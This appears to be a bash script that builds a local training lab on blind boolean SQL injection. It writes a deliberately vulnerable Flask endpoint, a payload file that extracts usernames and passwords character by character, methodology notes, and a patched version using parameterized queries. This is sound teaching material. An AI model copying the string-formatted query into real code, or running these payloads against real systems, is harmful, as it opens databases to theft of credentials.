#!/usr/bin/env bash

set -e

BASE="/home/karime/portswigger_labs/sqli/03-blind-boolean/01-blind-true-false"

echo "[+] Building Blind Boolean SQLi lab..."
echo "    $BASE"

mkdir -p "$BASE"/{vuln,exploit,notes,fix,payloads,automation,db,reports}

# =========================
# README
# =========================

cat > "$BASE/README.md" << 'EOF'
# 06 — Blind Boolean SQL Injection

## Concept
No output, no errors — only true/false behavior.

## Core idea
We infer data by observing response differences.

Example:
- TRUE → page normal
- FALSE → page different / empty / error

EOF

# =========================
# VULNERABLE APP
# =========================

cat > "$BASE/vuln/vuln.py" << 'EOF'
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route("/user")
def user():

    username = request.args.get("username", "")

    conn = sqlite3.connect("app.db")
    cur = conn.cursor()

    # Blind vulnerable query
    query = f"""
        SELECT id, username
        FROM users
        WHERE username = '{username}'
    """

    try:
        result = cur.execute(query).fetchone()

        if result:
            return {"exists": True}
        else:
            return {"exists": False}

    except:
        return {"exists": False}

if __name__ == "__main__":
    app.run(debug=True)
EOF

# =========================
# PAYLOADS
# =========================

cat > "$BASE/exploit/payloads.txt" << 'EOF'
# TRUE CONDITION
admin' AND 1=1--

# FALSE CONDITION
admin' AND 1=2--

# CHARACTER EXTRACTION

admin' AND SUBSTR((SELECT username FROM users LIMIT 1),1,1)='a'--

admin' AND SUBSTR((SELECT password FROM users LIMIT 1),1,1)='a'--

# LENGTH GUESSING
admin' AND LENGTH((SELECT username FROM users LIMIT 1))=5--

EOF

# =========================
# NOTES
# =========================

cat > "$BASE/notes/methodology.txt" << 'EOF'
BLIND BOOLEAN SQLi FLOW

STEP 1 — Confirm injection
AND 1=1 vs AND 1=2

STEP 2 — Identify response difference

STEP 3 — Extract data character by character:
SUBSTR()

STEP 4 — Automate extraction
EOF

# =========================
# FIX
# =========================

cat > "$BASE/fix/fix.py" << 'EOF'
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route("/user")
def user():

    username = request.args.get("username", "")

    conn = sqlite3.connect("app.db")
    cur = conn.cursor()

    query = "SELECT id, username FROM users WHERE username = ?"

    result = cur.execute(query, (username,)).fetchone()

    return {"exists": bool(result)}
EOF

# =========================
# DB
# =========================

cat > "$BASE/db/schema.txt" << 'EOF'
TABLE users:
- id
- username
- password
EOF

echo "[+] Blind Boolean SQLi lab created"
